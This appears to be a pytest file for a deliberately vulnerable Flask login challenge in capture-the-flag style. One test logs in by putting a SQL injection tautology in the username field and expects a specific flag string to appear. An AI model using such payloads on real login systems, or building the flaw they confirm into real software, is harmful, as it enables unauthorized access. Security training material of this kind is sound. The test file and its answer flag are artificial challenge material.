from app import create_app


def make_client(tmp_path):
    app = create_app(
        {
            "TESTING": True,
            "SECRET_KEY": "test-key",
            "DATABASE": str(tmp_path / "test.db"),
        }
    )
    return app.test_client()


def test_health(tmp_path):
    response = make_client(tmp_path).get("/health")
    assert response.status_code == 200
    assert response.get_json() == {"status": "ok"}


def test_bad_credentials_do_not_authenticate(tmp_path):
    client = make_client(tmp_path)
    response = client.post(
        "/login",
        data={"username": "admin", "password": "incorrect"},
        follow_redirects=True,
    )
    assert b"credenciales no son" in response.data
    assert b"FLAG{" not in response.data


def test_classic_tautology_logs_in_as_admin(tmp_path):
    client = make_client(tmp_path)
    response = client.post(
        "/login",
        data={"username": "admin' OR 1=1-- ", "password": "anything"},
        follow_redirects=True,
    )
    assert response.status_code == 200
    assert b"CHRONOS{sqli_bypass_tautology_login_6406}" in response.data


def test_non_admin_cannot_see_flag(tmp_path):
    client = make_client(tmp_path)
    response = client.post(
        "/login",
        data={"username": "guest", "password": "welcome-to-portal"},
        follow_redirects=True,
    )
    assert response.status_code == 200
    assert b"rea restringida" in response.data
    assert b"FLAG{" not in response.data
